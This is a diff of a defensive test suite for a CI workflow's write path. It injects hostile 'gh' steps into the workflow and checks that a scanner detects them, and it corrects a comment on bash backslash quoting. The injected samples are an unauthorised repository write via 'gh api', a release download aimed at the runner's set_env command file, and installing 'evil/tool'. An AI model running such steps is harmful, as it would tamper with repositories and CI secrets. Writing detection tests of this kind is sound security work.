+    // read flag SPELLINGS; the last two are the axes that filter could not see at all.
+    for (const [injected, subcommand, flag] of [
+      ['gh api --method PUT repos/$REPO/contents/x -f content=y', 'api', '--method'],
+      ['gh api -XPUT repos/$REPO/contents/x -fcontent=y', 'api', '-XPUT'],
+      [
+        'gh release download v1 --pattern "*" --output /home/runner/work/_temp/_runner_file_commands/set_env_x',
+        'release',
+        '--output',
+      ],
+      ['gh extension install evil/tool', 'extension', undefined],
+    ] as Array<[string, string, string | undefined]>) {
       const mutated = src.replace(
         /^ {6}- name: Report skill-fetch failure$/m,
-        `      - name: Publish the fold\n        run: |\n          ${spelling}\n      - name: Report skill-fetch failure`
+        `      - name: Publish the fold\n        run: |\n          ${injected}\n      - name: Report skill-fetch failure`
       );
       expect(mutated, 'the injection anchor moved').not.toBe(src);
-      expect(ghWrites(mutated), `a gh write was not seen: ${spelling}`).toHaveLength(1);
+      expect(ghSubcommands(mutated), `a gh subcommand was not seen: ${injected}`).toContain(subcommand);
+      if (flag) expect(ghFlags(mutated), `a gh flag was not seen: ${injected}`).toContain(flag);
     }
     // And no `gh` at all in the step that holds PUSH_TOKEN.
     expect(commandsNamed(step(src, 'Push fold commit'), /^gh$/)).toEqual([]);
@@ -3146,7 +3415,9 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       // The other direction, so the rule is not "delete every backslash": inside DOUBLE quotes
       // a backslash only escapes `"`, `$`, backtick and itself, so `"a\b"` keeps it.
       ['"a\\b"', 'a\\b'],
-      // And it survives where bash keeps it too, before an ordinary character.
+      // And outside quotes it does NOT survive the same way - the backslash goes and the
+      // ordinary character stays, so `\a` is the word `a`. (The row above is the one where a
+      // backslash is kept, and it is the double-quoted one.)
       ['\\a', 'a'],
     ];
     for (const [input, expected] of cases) {
